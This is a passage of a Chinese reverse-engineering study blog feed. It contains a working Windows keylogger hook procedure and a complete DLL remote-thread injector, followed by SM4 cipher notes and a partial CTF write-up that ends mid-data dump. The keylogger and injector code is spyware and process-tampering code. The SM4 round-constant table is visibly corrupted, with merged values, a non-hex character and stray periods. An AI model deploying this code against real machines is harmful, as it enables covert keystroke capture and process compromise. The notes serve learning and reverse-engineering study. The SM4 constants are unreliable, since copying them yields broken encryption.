class="built_in">strcpy</span>(ch, <span class="string">&quot;[DELETE]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_LEFT: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[LEFT]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_UP: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[RIGHT]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_RIGHT: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[RIGHT]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_DOWN: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[DOWN]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_LWIN: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[WIN KEY]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_RWIN: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[WIN KEY]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_LCONTROL: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[CTRL]&quot;</span>);  <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_RCONTROL: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[CTRL]&quot;</span>);  <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F1: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F1]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F2: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F2]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F3: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F3]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F4: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F4]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F5: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F5]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F6: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F6]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F7: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F7]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F8: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F8]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F9: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F9]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F10: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F10]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F11: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F11]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F12: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F12]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">BYTE ks[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">GetKeyboardState</span>(ks);</span><br><span class="line">WORD w;</span><br><span class="line">UINT scan = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">ToAscii</span>(wParam, scan, ks, &amp;w, <span class="number">0</span>);</span><br><span class="line">ch[<span class="number">0</span>] = <span class="built_in">char</span>(w);</span><br><span class="line">ch[<span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">writeToFile</span>(ch);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">CallNextHookEx</span>(g_hHook, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时dllmain就可以什么都不干了，只用找到当前进程句柄就好</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HMODULE hinstDLL,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD  dwReason,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lParam</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (dwReason)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">g_hInstance = hinstDLL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就可以在固定位置生成文件写入按键了，上面的代码参考了github上的一个项目</p><hr><h2 id="DLL注入">DLL注入</h2><p>从外部促使目标进程调用LoadLibrary的API使得执行DLLMain</p><p>书上只写了两种方法，之后有机会试一试反射注入，听说效果更好</p><p>第一种：</p><p>远程线程注入，创建一个远程线程代替原本进程注入进去，</p><p>函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINBASEAPI</span></span><br><span class="line"><span class="function">_Ret_maybenull_</span></span><br><span class="line"><span class="function">HANDLE</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">CreateRemoteThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ SIZE_T dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_opt_ LPDWORD lpThreadId</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><p>其中第4个参数（如果没有第二个可选参数就是第三个）是线程回调函数地址，当创建好线程后，这个线程就会执行这个函数。其最终的传入参数是CreateRemoteThread的第5个参数，这里它一定是一个指针，所以如果要传入多个参数的话需要一些数据结构，比如数组指针或者结构体指针。</p><p>由于传入参数是一个指针，而一个进程只能访问它拥有的内存空间，所以为了把dll成功注入，需要先把参数写到目标进程的内存中</p><p>函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">WINBASEAPI</span><br><span class="line">_Ret_maybenull_</span><br><span class="line">_Post_writable_byte_size_(dwSize)</span><br><span class="line"><span class="function">LPVOID</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">VirtualAllocEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPVOID lpAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ SIZE_T dwSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD flAllocationType,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD flProtect</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><p>是用于在目标进程内申请空间并返回对应指针的函数</p><p>函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">WINBASEAPI</span><br><span class="line">_Success_(<span class="keyword">return</span> != FALSE)</span><br><span class="line"><span class="function">BOOL</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">WriteProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPVOID lpBaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_reads_bytes_(nSize) LPCVOID lpBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ SIZE_T nSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_opt_ SIZE_T* lpNumberOfBytesWritten</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><p>这个是写入内存的函数，第二个参数是之前申请到的地址，第三个参数是写入的内容。</p><p>然后就可以直接用第二个参数当写入内容的指针了</p><p>inject函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">inject</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span> </span>&#123;</span><br><span class="line">HANDLE hProcess = <span class="number">0</span>, hThread = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!(hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID)))<span class="comment">//取得对应PID句柄</span></span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;open %d failed\n&quot;</span>), dwPID);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(TCHAR);</span><br><span class="line">LPVOID pBuf = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);<span class="comment">//申请内存</span></span><br><span class="line"><span class="keyword">if</span> (pBuf == <span class="number">0</span>) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;memory alloc failed\n&quot;</span>));</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, pBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>);<span class="comment">//写入地址</span></span><br><span class="line">HMODULE kernel = <span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (kernel == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">LPTHREAD_START_ROUTINE pThreadProc = (LPTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(kernel, <span class="string">&quot;LoadLibraryW&quot;</span>);<span class="comment">//获取LodaLibrary地址</span></span><br><span class="line">hThread = <span class="built_in">CreateRemoteThread</span>(hProcess,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">pThreadProc,<span class="comment">//线程回调函数</span></span><br><span class="line">pBuf,<span class="comment">//传参</span></span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;create hThread failed\n&quot;</span>));</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);<span class="comment">//等待线程结束</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在测试中，得知了x86的进程，那么注入器和dll也要是x86的，x64的也一样</p><p>还没学DLL卸载QAQ</p>]]></content>
    
    
    <summary type="html">好久没有更新了，现在更新一波</summary>
    
    
    
    <category term="逆向工程核心原理" scheme="https://www.pri87.vip/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"/>
    
    
    <category term="逆向" scheme="https://www.pri87.vip/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="学习" scheme="https://www.pri87.vip/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="windows" scheme="https://www.pri87.vip/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>加密04-SM4</title>
    <link href="https://www.pri87.vip/posts/77e5000d.html"/>
    <id>https://www.pri87.vip/posts/77e5000d.html</id>
    <published>2024-06-05T03:22:04.000Z</published>
    <updated>2024-06-17T16:20:30.399Z</updated>
    
    <content type="html"><![CDATA[<p>好耶，不用介绍了，</p><p><a href="http://www.gmbz.org.cn/main/viewfile/20180108015408199368.html">文档连接</a></p><p>感觉和AES加密差不多</p><h1>SM4/SMS4</h1><h2 id="性质">性质</h2><p>分组算法，分组长度位128位，密钥长度位128位</p><h2 id="过程">过程</h2><h3 id="加密">加密</h3><p>32次迭代</p><p>输入为X0到X4共十六字节，每个X有4字节，通过轮密钥运算生成X0对应的X5…以此类推，直到生成了X32,X33,X34,X35</p><p>具体来说<br>$$<br>X_{i+4}=F(X_i,X_{i+1},X_{i+2},X_{i+3},rk_i)<br>$$</p><p>其中F为轮函数：<br>$$<br>F(X_i,X_{i+1},X_{i+2},X_{i+3},rk_i) = X_0\oplus T(X_{i+1}\oplus X_{i+2}\oplus X_{i+3}\oplus rk_i)<br>$$</p><p>其中T为合成置换，$T(x) = L(\tau)$，其中L是线性变换，$\tau$是非线性变换</p><p>对于$\tau$,</p><p>把输入的四个值转为hex，查S盒，得到下一个值</p><p><img src="https://s2.loli.net/2024/06/05/ZCGLwJEIuyHD5VO.png" alt="image-20240605162119411"></p><p>得到转化后的4个值记为B</p><p>结果C=<br>$$<br>L(B)=B\oplus(B&lt;&lt;&lt;2)\oplus(B&lt;&lt;&lt;10)\oplus(B&lt;&lt;&lt;18)\oplus(B&lt;&lt;&lt;24)<br>$$<br>&lt;&lt;&lt;是32位循环左移</p><p>1次反序变换</p><p>将结果变为X35,X34,X33,X32</p><h3 id="密钥扩展">密钥扩展</h3><p>FK系统参数  CK固定参数 MK输入密钥一共4个</p><p>轮密钥由加密密钥生成</p><p>加密密钥K0到K3由$MK_i$和$FK_i$异或得到</p><p>后面的则是$rK_i$=<br>$$<br>K_{I+4}=K_i \oplus T’(K_{i+1} \oplus K_{i+2} \oplus K_{i+3}\oplus CK_i)<br>$$<br>T’是将T的线性变换L换成下面的L‘：<br>$$<br>L’(B)=B\oplus(B&lt;&lt;&lt;13)\oplus(B&lt;&lt;&lt;23)<br>$$</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">FK0</span> <span class="operator">=</span> A3B1BAC6</span><br><span class="line"><span class="attribute">FK1</span> <span class="operator">=</span> <span class="number">56</span>AA3350</span><br><span class="line"><span class="attribute">FK2</span> <span class="operator">=</span> <span class="number">677</span>D9197</span><br><span class="line"><span class="attribute">FK3</span> <span class="operator">=</span> B27022DC</span><br></pre></td></tr></table></figure><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CK = [<span class="number">00070E15</span>，1C232A31,383F464D,<span class="number">545B6269</span>，<span class="number">70777E85</span>,8C939AA1,A8AFB6BD,C4CBD2D9E0E7EEF5FC030A11,181F262D,<span class="number">343B4249</span>，<span class="number">50575E65</span>，6C737A81,888F969D,A4ABB2B9，C0C7CED5,DCE3EAF1,F8FF060D,<span class="number">141B2229</span>，<span class="number">30373E45</span>,4C535A61，686F767D<span class="number">.848B9299</span>.A0A7AEB5，IBCC3CAD1,D8DFE6ED,F4FB0209<span class="number">.10171E25</span>,2C333A41,484F565D,<span class="number">646B7279</span>]</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">SM4基本介绍</summary>
    
    
    
    <category term="密码" scheme="https://www.pri87.vip/categories/%E5%AF%86%E7%A0%81/"/>
    
    
    <category term="分组" scheme="https://www.pri87.vip/tags/%E5%88%86%E7%BB%84/"/>
    
  </entry>
  
  <entry>
    <title>刷题记录（4）</title>
    <link href="https://www.pri87.vip/posts/22913c82.html"/>
    <id>https://www.pri87.vip/posts/22913c82.html</id>
    <published>2024-06-03T14:30:57.000Z</published>
    <updated>2024-06-17T16:20:30.401Z</updated>
    
    <content type="html"><![CDATA[<h1>litctf</h1><h2 id="ezpy">ezpy</h2><p>这个文件一看是python打包的</p><p>然后本身解包很简单，但是找主函数调用的库找不到QAQ</p><p>但是exe可以执行，那么肯定库是在的</p><p>根据<a href="https://blog.csdn.net/as604049322/article/details/119834495">Pyinstaller打包的exe之一键反编译py脚本与防反编译_pyinstaller防止反编译-CSDN博客</a></p><p>查找资料，通过把PYZ-00.pyz打开查看内容找到最后的库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pyi-archive_viewer ezpy.exe</span><br><span class="line">o PYZ-00.pyz</span><br></pre></td></tr></table></figure><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x xxx.<span class="keyword">lib</span></span><br></pre></td></tr></table></figure><p>然后就和普通的操作一样了</p><h1>CISCN</h1><h2 id="asm-re">asm_re</h2><p>这个是arm的汇编，看起来有点难QAQ</p><p>写脚本把代码跑出来又不是很现实</p><p>所以尝试丢给ai，写脚本解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 原始数据</span></span><br><span class="line">data = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">__const:0000000100003F10 D7                            unk_100003F10 DCB 0xD7                  ; DATA XREF: _main+34↑o</span></span><br><span class="line"><span class="string">__const:0000000100003F11 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F12 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F13 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F14 B7                            DCB 0xB7</span></span><br><span class="line"><span class="string">__const:0000000100003F15 21                            DCB 0x21 ; !</span></span><br><span class="line"><span class="string">__const:0000000100003F16 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F17 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F18 47                            DCB 0x47 ; G</span></span><br><span class="line"><span class="string">__const:0000000100003F19 1E                            DCB 0x1E</span></span><br><span class="line"><span class="string">__const:0000000100003F1A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F1B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F1C 27                            DCB 0x27 ; &#x27;</span></span><br><span class="line"><span class="string">__const:0000000100003F1D 20                            DCB 0x20</span></span><br><span class="line"><span class="string">__const:0000000100003F1E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F1F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F20 E7                            DCB 0xE7</span></span><br><span class="line"><span class="string">__const:0000000100003F21 26                            DCB 0x26 ; &amp;</span></span><br><span class="line"><span class="string">__const:0000000100003F22 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F23 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F24 D7                            DCB 0xD7</span></span><br><span class="line"><span class="string">__const:0000000100003F25 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F26 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F27 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F28 27                            DCB 0x27 ; &#x27;</span></span><br><span class="line"><span class="string">__const:0000000100003F29 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F2A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F2B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F2C 07                            DCB    7</span></span><br><span class="line"><span class="string">__const:0000000100003F2D 20                            DCB 0x20</span></span><br><span class="line"><span class="string">__const:0000000100003F2E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F2F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F30 C7                            DCB 0xC7</span></span><br><span class="line"><span class="string">__const:0000000100003F31 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F32 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F33 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F34 47                            DCB 0x47 ; G</span></span><br><span class="line"><span class="string">__const:0000000100003F35 1E                            DCB 0x1E</span></span><br><span class="line"><span class="string">__const:0000000100003F36 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F37 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F38 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F39 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F3A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F3B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F3C 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F3D 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F3E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F3F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F40 F7                            DCB 0xF7</span></span><br><span class="line"><span class="string">__const:0000000100003F41 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F42 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F43 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F44 07                            DCB    7</span></span><br><span class="line"><span class="string">__const:0000000100003F45 20                            DCB 0x20</span></span><br><span class="line"><span class="string">__const:0000000100003F46 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F47 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F48 37                            DCB 0x37 ; 7</span></span><br><span class="line"><span class="string">__const:0000000100003F49 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F4A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F4B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F4C 07                            